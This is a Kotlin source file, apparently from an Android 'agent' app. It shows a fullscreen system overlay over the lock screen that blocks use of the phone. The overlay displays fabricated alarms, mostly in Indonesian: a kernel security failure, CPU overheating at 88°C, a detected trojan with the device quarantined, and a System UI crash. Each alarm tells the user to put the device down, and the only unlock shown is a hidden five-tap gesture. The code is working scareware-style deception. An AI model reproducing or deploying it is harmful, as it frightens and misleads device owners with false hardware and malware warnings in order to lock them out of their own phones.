package com.dwisnulabs.agent

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView

object LockOverlayManager {
    private const val TAG = "DwisnuLabsLockOverlay"
    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    fun isShowing(): Boolean = AppState.isLocked

    fun show(context: Context) {
        AppState.isLocked = true

        mainHandler.post {
            // Layer 1: Launch Fullscreen Scare Activity
            try {
                ScareActivity.start(context)
            } catch (e: Exception) {
                Log.e(TAG, "Error starting ScareActivity: ${e.message}")
            }

            // Layer 2: WindowManager Fullscreen Overlay
            if (overlayView != null) return@post

            if (!Settings.canDrawOverlays(context)) {
                Log.w(TAG, "SYSTEM_ALERT_WINDOW permission not granted yet. Using ScareActivity as primary.")
                return@post
            }

            try {
                windowManager = context.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager

                val layoutParams = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                    },
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                overlayView = createScareView(context.applicationContext)
                windowManager?.addView(overlayView, layoutParams)
                Log.d(TAG, "Scare Lock Overlay displayed successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "Error displaying lock overlay: ${e.message}", e)
            }
        }
    }

    fun hide() {
        AppState.isLocked = false

        mainHandler.post {
            // Close ScareActivity
            try {
                ScareActivity.instance?.finish()
            } catch (e: Exception) {
                Log.e(TAG, "Error finishing ScareActivity: ${e.message}")
            }

            // Remove Overlay View
            if (overlayView != null && windowManager != null) {
                try {
                    windowManager?.removeView(overlayView)
                    Log.d(TAG, "Lock overlay removed.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error removing overlay: ${e.message}", e)
                } finally {
                    overlayView = null
                }
            }
        }
    }

    private fun createScareView(context: Context): View {
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
            isClickable = true
            isFocusable = true
        }

        val theme = AppState.scareTheme

        val titleView = TextView(context).apply {
            textSize = 20f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        val descView = TextView(context).apply {
            textSize = 15f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            setLineSpacing(1.2f, 1.2f)
            setPadding(0, 0, 0, 48)
        }

        val instructionView = TextView(context).apply {
            textSize = 14f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
        }

        when (theme) {
            ScareTheme.SYSTEM_ERROR -> {
                titleView.text = "⚠️ [CRITICAL SYSTEM ERROR 0x8849F]"
                titleView.setTextColor(Color.parseColor("#FF5252"))
                descView.text = "KERNEL_SECURITY_CHECK_FAILURE\nInternal storage block corrupted due to excessive load.\n\nSistem dinonaktifkan sementara untuk mencegah kerusakan permanen pada memori internal dan chipset."
                descView.setTextColor(Color.parseColor("#FFD54F"))
                instructionView.text = "DIANJURKAN: Diamkan perangkat selama 45–60 menit dalam kondisi dingin dan jangan dinyalakan!"
                instructionView.setTextColor(Color.WHITE)
            }
            ScareTheme.OVERHEAT -> {
                titleView.text = "🔥 [HARDWARE TEMPERATURE: 88°C]"
                titleView.setTextColor(Color.parseColor("#FF1744"))
                descView.text = "CRITICAL CPU & BATTERY OVERHEAT DETECTED.\nSuhu prosesor melampaui batas toleransi aman.\n\nRisiko degradasi baterai dan kerusakan hardware permanen."
                descView.setTextColor(Color.parseColor("#FF9100"))
                instructionView.text = "PERINGATAN: Perangkat dimatikan otomatis untuk pendinginan darurat. Jangan digunakan!"
                instructionView.setTextColor(Color.WHITE)
            }
            ScareTheme.SECURITY_THREAT -> {
                titleView.text = "🛡️ [ANDROID SECURITY PROTOCOL]"
                titleView.setTextColor(Color.parseColor("#FF3D00"))
                descView.text = "SUSPICIOUS EXPLOIT / TROJAN THREAT DETECTED.\nAktivitas jaringan berbahaya terdeteksi di perangkat ini.\n\nSistem telah mengisolasi akses aplikasi dan input untuk mencegah kebocoran data."
                descView.setTextColor(Color.parseColor("#80D8FF"))
                instructionView.text = "Sistem dalam mode karantina keamanan. Silakan tutup dan letakkan perangkat."
                instructionView.setTextColor(Color.WHITE)
            }
            ScareTheme.FAKE_CRASH -> {
                titleView.text = "❌ [SYSTEM UI HAS STOPPED]"
                titleView.setTextColor(Color.WHITE)
                descView.text = "Proses com.android.systemui tidak merespons.\nTerjadi kegagalan render tampilan antarmuka (Error 503)."
                descView.setTextColor(Color.LTGRAY)
                instructionView.text = "Silakan diamkan perangkat beberapa saat."
                instructionView.setTextColor(Color.GRAY)
            }
        }

        // Secret Emergency Unlock: Tap title 5 times rapidly
        var tapCount = 0
        var lastTapTime = 0L
        titleView.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTapTime < 800) {
                tapCount++
                if (tapCount >= 5) {
                    hide()
                }
            } else {
                tapCount = 1
            }
            lastTapTime = now
        }

        root.addView(titleView)
        root.addView(descView)
        root.addView(instructionView)

        return root
    }
}
